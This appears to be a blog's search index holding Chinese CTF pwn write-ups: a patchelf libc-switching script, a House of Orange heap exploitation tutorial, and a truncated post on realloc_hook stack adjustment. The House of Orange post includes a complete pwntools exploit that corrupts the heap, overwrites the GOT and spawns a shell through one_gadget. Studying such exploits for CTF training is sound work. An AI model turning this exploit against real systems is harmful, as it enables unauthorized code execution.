<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>更换libc丝滑小连招</title>
    <link href="/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/"/>
    <url>/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="更换libc丝滑小连招"><a href="#更换libc丝滑小连招" class="headerlink" title="更换libc丝滑小连招"></a>更换libc丝滑小连招</h2><p>主要参考大佬的一篇文章</p><p><a href="https://blog.csdn.net/j284886202/article/details/142406824?spm=1001.2014.3001.5502">★pwn 更改pwn题libc保姆级教程★</a></p><p>主要记录一下clibc的脚本</p><p>大佬给的脚本不是很符合自己的习惯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>FILE_NAME=<span class="hljs-variable">$1</span><br>LIBC_VERSION=<span class="hljs-variable">$2</span><br>WORKDIR=$(<span class="hljs-built_in">pwd</span>)<br><br><span class="hljs-comment"># 判断 ELF 文件位数</span><br>EBIT=$(file <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | <span class="hljs-built_in">cut</span> -c 1-2)<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/i386<br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;64&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/amd64<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It&#x27;s not an ELF file.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 查找 libc 文件</span><br>libc_dir=$(find <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_DIR</span>&quot;</span> -name <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>*&quot;</span>)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not supported version or your <span class="hljs-variable">$LIBC_DIR</span> doesn&#x27;t have libc.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 提取版本号</span><br>LIBC_VERSION_CLEAN=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;-&#x27;</span> -f 1)<br>LIBC_VERSION_MAJOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 1)<br>LIBC_VERSION_MINOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 2)<br><br><span class="hljs-comment"># 组合短版本号</span><br>LIBC_VERSION_SHORT=<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>.<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span><br><br><span class="hljs-comment"># 处理动态链接库</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;success!!!&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">clibc xxx &lt;完整版本号&gt;<br><span class="hljs-attr">#clibc ret 2</span><span class="hljs-number">.27</span><span class="hljs-number">-3</span>ubu<span class="hljs-symbol">ntu1</span><span class="hljs-number">.6</span>_amd<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>这样就可以丝滑切换任何小版本了</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>更换libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Orange</title>
    <link href="/2024/09/12/House-of-Orange/"/>
    <url>/2024/09/12/House-of-Orange/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中<strong>无法使用 free 函数</strong>，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))<br></code></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">assert((<span class="hljs-name">old_top</span> == initial_top(<span class="hljs-name">av</span>) <span class="hljs-symbol">&amp;&amp;</span> old_size == <span class="hljs-number">0</span>) ||<br>     ((<span class="hljs-name">unsigned</span> long) (<span class="hljs-name">old_size</span>) &gt;= MINSIZE <span class="hljs-symbol">&amp;&amp;</span><br>      prev_inuse(<span class="hljs-name">old_top</span>) <span class="hljs-symbol">&amp;&amp;</span><br>      ((<span class="hljs-name">unsigned</span> long)old_end &amp; pagemask) == <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><p>注意事项：伪造的top_chunk要页对齐，当top_chunk符合页对齐，且大小小于0x90时，当申请比top_chunk大的堆是，释放的top_chunk会进入fastbins，可以根据需求进行fastbins攻击，放入这个fastbins的chunk的大小为：top_chunk - 0x20</p><p>所以我们可能根据情况进行unsorted bin攻击或者进行fast bin攻击</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/House_of_Orange">例题下载</a></p><p>查看保护 ，没有开启pie和got写入保护</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122055569.png" alt="查看保护"></p><p>ida反编译发现没有free函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122056645.png" alt="ida反编译"></p><p>想到用House of Orange</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122057567.png" alt="edit函数"></p><p>发现编辑函数存在溢出，可以控制chunk头和chunk指针，那么我们就可以用fastbin攻击</p><p>攻击流程：</p><ol><li>伪造top_chunk（确保页对齐）</li><li>然后申请堆空间，使top_chunk剩余0x90大小</li><li>申请大于top_chunk大小的堆空间，此时top_chunk进入fastbin</li><li>通过堆溢出，修改fastbin的fd指针，进行fastbin攻击</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x0000000000400A9C</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.ADD PAGE</span><br><span class="hljs-string">2.EDIT PAGE</span><br><span class="hljs-string">3.SHOW PAGE</span><br><span class="hljs-string">4.EXIT</span><br><span class="hljs-string">input your chioce:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0xfe1</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0xf40</span> , <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x90</span> , <span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br>fake_chunk = <span class="hljs-number">0x60208d</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf48</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xa3</span> + p64(puts_got)<br>edit(<span class="hljs-number">4</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-built_in">hex</span>(leak_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span> , leak_addr)<br>base_addr = leak_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4525a</span> , <span class="hljs-number">0xef9f4</span> , <span class="hljs-number">0xf0897</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">2</span>]<br><br>payload = p64(execve)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Orange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过 realloc_hook 调整栈帧使 onegadget 生效</title>
    <link href="/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/"/>
    <url>/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p><p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc调整栈帧，然后在运行 onegadget 。</p><h2 id="了解-realloc"><a href="#了解-realloc" class="headerlink" title="了解 realloc"></a>了解 realloc</h2><p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的），其中realloc_hook在malloc_hook - 0x08的位置。</p><p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>00000000000846C0 realloc         proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="hljs-symbol">.text:</span>00000000000846C0 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>00000000000846C0                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span>             <span class="hljs-comment">; Alternative name is &#x27;__libc_realloc&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000846C2                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span>00000000000846C4                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span>00000000000846C6                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span>00000000000846C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846CB                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000846CC                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000846CD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000846D0                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>00000000000846D4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:__realloc_hook_ptr<br><span class="hljs-symbol">.text:</span>00000000000846<span class="hljs-built_in">DB</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000846DE                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>00000000000846E1                 <span class="hljs-keyword">jnz</span>     loc_848E8  <span class="hljs-comment">; 跳转执行 realloc_hook</span><br><span class="hljs-symbol">.text:</span>00000000000846E7                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846EA                 <span class="hljs-keyword">jnz</span>     short loc_846F5<br><span class="hljs-symbol">.text:</span>00000000000846EC                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span 